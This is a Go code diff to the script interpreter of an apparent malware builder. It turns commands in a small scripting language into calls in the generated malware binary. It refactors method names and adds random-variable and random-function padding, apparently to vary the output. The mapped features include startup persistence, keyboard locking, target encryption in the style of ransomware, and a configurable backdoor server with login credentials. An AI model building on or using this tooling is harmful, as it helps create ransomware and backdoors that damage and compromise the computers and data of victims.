@@ -74,18 +74,18 @@ func Interpeter(file_to_read string) {
 			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")
 			switch funct[2] { // Checks the function that were called from the domain
 			case "x":
-				mal.Malware_addContent("win.Window_setX(\"" + funct[4] + "\")")
+				mal.AddContent("win.Window_setX(\"" + funct[4] + "\")")
 			case "y":
-				mal.Malware_addContent("win.Window_setY(\"" + funct[4] + "\")")
+				mal.AddContent("win.Window_setY(\"" + funct[4] + "\")")
 
 			case "title":
-				mal.Malware_addContent("win.Window_setTitle(\"" + funct[4] + "\")")
+				mal.AddContent("win.Window_setTitle(\"" + funct[4] + "\")")
 
 			case "goto":
-				mal.Malware_addContent("win.Window_goToUrl(\"" + funct[4] + "\")")
+				mal.AddContent("win.Window_goToUrl(\"" + funct[4] + "\")")
 
 			case "display":
-				mal.Malware_addContent("win.Window_display(\"" + funct[4] + "\")")
+				mal.AddContent("win.Window_display(\"" + funct[4] + "\")")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -97,12 +97,12 @@ func Interpeter(file_to_read string) {
 
 			switch funct[2] { // Function within this domain
 			case "exit":
-				mal.Malware_addContent("sys.System_exit(\"" + funct[4] + "\")")
+				mal.AddContent("sys.System_exit(\"" + funct[4] + "\")")
 
 			case "out":
-				mal.Malware_addContent("sys.System_out(\"" + funct[4] + "\")")
+				mal.AddContent("sys.System_out(\"" + funct[4] + "\")")
 			case "add_to_startup":
-				mal.Malware_addContent("sys.System_add_to_startup()")
+				mal.AddContent("sys.System_add_to_startup()")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -113,9 +113,14 @@ func Interpeter(file_to_read string) {
 
 			switch funct[2] {
 			case "name":
-				mal.Malware_setBinaryName(funct[4])
+				mal.SetBinaryName(funct[4])
 			case "extension":
-				mal.Malware_setExtension(funct[4])
+				mal.SetExtension(funct[4])
+			case "add_random_variable":
+				io.Append_domain("fmt") // Otherwise the malware wont compile
+				mal.AddRandomVariable()
+			case "add_random_function":
+				mal.AddRandomFunction()
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -127,19 +132,19 @@ func Interpeter(file_to_read string) {
 
 			switch funct[2] {
 			case "run":
-				mal.Malware_addContent("time.Time_run()")
+				mal.AddContent("time.Time_run()")
 			case "year":
-				mal.Malware_addContent("time.Time_setYear(\"" + funct[4] + "\")")
+				mal.AddContent("time.Time_setYear(\"" + funct[4] + "\")")
 			case "month":
-				mal.Malware_addContent("time.Time_setMonth(\"" + funct[4] + "\")")
+				mal.AddContent("time.Time_setMonth(\"" + funct[4] + "\")")
 			case "day":
-				mal.Malware_addContent("time.Time_setDay(\"" + funct[4] + "\")")
+				mal.AddContent("time.Time_setDay(\"" + funct[4] + "\")")
 			case "hour":
-				mal.Malware_addContent("time.Time_setHour(\"" + funct[4] + "\")")
+				mal.AddContent("time.Time_setHour(\"" + funct[4] + "\")")
 			case "min":
-				mal.Malware_addContent("time.Time_setMin(\"" + funct[4] + "\")")
+				mal.AddContent("time.Time_setMin(\"" + funct[4] + "\")")
 			case "until":
-				mal.Malware_addContent("time.Time_until(\"" + funct[4] + "\")")
+				mal.AddContent("time.Time_until(\"" + funct[4] + "\")")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -150,9 +155,9 @@ func Interpeter(file_to_read string) {
 
 			switch funct[2] {
 			case "lock":
-				mal.Malware_addContent("keyboard.Keyboard_lock()")
+				mal.AddContent("keyboard.Keyboard_lock()")
 			case "unlock":
-				mal.Malware_addContent("keyboard.Keyboard_unlock()")
+				mal.AddContent("keyboard.Keyboard_unlock()")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -162,21 +167,21 @@ func Interpeter(file_to_read string) {
 			switch funct[2] {
 			case "set_target":
 				io.Append_domain("attack_vector")
-				mal.Malware_addContent("attack.Encrypt_set_target(\"" + funct[4] + "\")")
+				mal.AddContent("attack.Encrypt_set_target(\"" + funct[4] + "\")")
 			case "set_encryption":
 				io.Append_domain("attack_vector")
-				mal.Malware_addContent("attack.Encrypt_set_encryption_method(\"" + funct[4] + "\")")
+				mal.AddContent("attack.Encrypt_set_encryption_method(\"" + funct[4] + "\")")
 			case "encrypt":
 				io.Append_domain("attack_vector")
-				mal.Malware_addContent("attack.Encrypt_encrypt()")
+				mal.AddContent("attack.Encrypt_encrypt()")
 			case "decrypt":
 				io.Append_domain("attack_vector")
-				mal.Malware_addContent("attack.Encrypt_decrypt()")
+				mal.AddContent("attack.Encrypt_decrypt()")
 
 			// Hash, everything here is done in realtime when compiling.
 			case "set_hash":
 				io.Append_domain("attack_vector")
-				mal.Malware_addContent("attack.Set_hash(\"" + funct[4] + "\")")
+				mal.AddContent("attack.Set_hash(\"" + funct[4] + "\")")
 				attack_vector.Set_hash(funct[4])
 			case "hash":
 				attack_vector.Hash(funct[4])
@@ -190,30 +195,30 @@ func Interpeter(file_to_read string) {
 			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")
 			switch funct[2] {
 			case "set_port":
-				mal.Malware_addContent("back.Set_port(\"" + funct[4] + "\")")
+				mal.AddContent("back.Set_port(\"" + funct[4] + "\")")
 			case "start":
-				mal.Malware_addContent("back.Start()")
+				mal.AddContent("back.Start()")
 			case "stop":
-				mal.Malware_addContent("back.Close()")
+				mal.AddContent("back.Close()")
 			case "serve":
-				mal.Malware_addContent("back.Serve()")
+				mal.AddContent("back.Serve()")
 			case "read_size":
-				mal.Malware_addContent("back.Set_read_size(\"" + funct[4] + "\")")
+				mal.AddContent("back.Set_read_size(\"" + funct[4] + "\")")
 
 			case "welcome":
-				mal.Malware_addContent("back.Set_welcome_msg(\"" + funct[4] + "\")")
+				mal.AddContent("back.Set_welcome_msg(\"" + funct[4] + "\")")
 
 			case "enable_login":
-				mal.Malware_addContent("back.Enable_login()")
+				mal.AddContent("back.Enable_login()")
 			case "disable_login":
-				mal.Malware_addContent("back.Disable_login()")
+				mal.AddContent("back.Disable_login()")
 
 			case "user":
-				mal.Malware_addContent("back.Set_username(\"" + funct[4] + "\")")
+				mal.AddContent("back.Set_username(\"" + funct[4] + "\")")
 			case "password":
-				mal.Malware_addContent("back.Set_password(\"" + funct[4] + "\")")
+				mal.AddContent("back.Set_password(\"" + funct[4] + "\")")
 			case "set_hash":
-				mal.Malware_addContent("back.Set_hash(\"" + funct[4] + "\")")
+				mal.AddContent("back.Set_hash(\"" + funct[4] + "\")")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
